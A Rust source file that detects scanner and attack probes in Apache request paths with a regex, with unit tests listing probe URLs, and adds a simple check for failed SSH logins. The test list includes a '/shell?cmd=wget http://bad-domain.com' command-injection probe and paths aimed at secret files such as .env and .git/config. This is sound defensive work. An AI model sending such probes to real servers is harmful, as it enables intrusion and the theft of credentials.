use regex::Regex;
use std::sync::LazyLock;

static BAD_APACHE_PATTERNS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?ix)
        # .env files
        \.env(\.[A-Za-z0-9_-]+)? |

        # Config files
        \.config |
        config\.json |

        # Suspicious extensions
        \.(php[0-9]*|env|zip|rsp|aspx|asp[0-9]*|jsp[0-9]*|cgi|xml)(\?|$) |

        # Suspicious directories
        /(service/api-docs|geoserver/.*|goform/.*|_profiler/.*| _ignition/.*|cgi-bin/.*|wp-[^/\s]+.*|solr.*|\.git(/.*)?$|evox.*) |

        # Remote command execution style
        /shell\? |

        # InfluxDB-like query scans
        /query\? |

        # Whatever it is
        \?XDEBUG_SESSION_START=
    ",
    )
    .unwrap()
});

pub fn is_bad_apache(path: &str) -> bool {
    BAD_APACHE_PATTERNS.is_match(path)
}

#[cfg(test)]
mod tests {
    use super::is_bad_apache;

    #[test]
    fn test_bad_paths() {
        let bad_paths = [
            "/.env",
            "/.env.bak",
            "/beep/.env.bak",
            "/.env/beep",
            "/.env/beep/boop",
            "/.config",
            "/config.json",
            "/test.php",
            "/test.php0",
            "/test.php1",
            "/test.php4",
            "/test.php9",
            "/cgi-bin/ls",
            "/wp-admin/install.php",
            "/solr/select?q=*",
            "/.git/config",
            "/.git",
            "/shell?cmd=wget http://bad-domain.com",
            "/query?q=SELECT+*+FROM+users",
            "/service/api-docs",
            "/mysqladmin/index.php?lang=en",
            "/mail/.env.db",
            "/db/phpmyadmin/index.php?lang=en",
            "/?XDEBUG_SESSION_START=phpstorm",
        ];

        for path in bad_paths {
            assert!(is_bad_apache(path), "Should match: {}", path);
        }
    }
}

pub fn is_bad_ssh(path: &str) -> bool {
    path.contains("Failed password") || path.contains("Invalid user")
}
